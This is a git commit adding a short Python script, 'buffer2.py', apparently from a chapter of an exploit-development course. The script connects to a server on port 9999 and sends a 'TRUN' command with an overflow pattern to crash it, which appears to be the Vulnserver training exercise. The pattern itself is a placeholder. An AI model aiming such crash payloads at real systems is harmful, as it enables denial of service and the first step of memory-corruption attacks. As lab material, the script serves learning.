8024880dee6870e52bc9de6ddd9a0d8c337f37ac
Vijay <vijayvkvelu@gmail.com>
2019-01-29 16:57:31 +0530

    Create buffer2.py

---
+++ Chapter 10/buffer2.py
@@ -0,0 +1,13 @@
+import socket 
+IP = raw_input("enter the IP to crash:") 
+PORT = 9999 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+s.connect((IP,PORT)) 
+banner = s.recv(1024) 
+print(banner) 
+command = "TRUN " 
+header = "|/.:/" 
+#buffer = "Z" * 10000 
+pattern = <value> 
+s.send (command + header + pattern) 
+print ("server dead") 
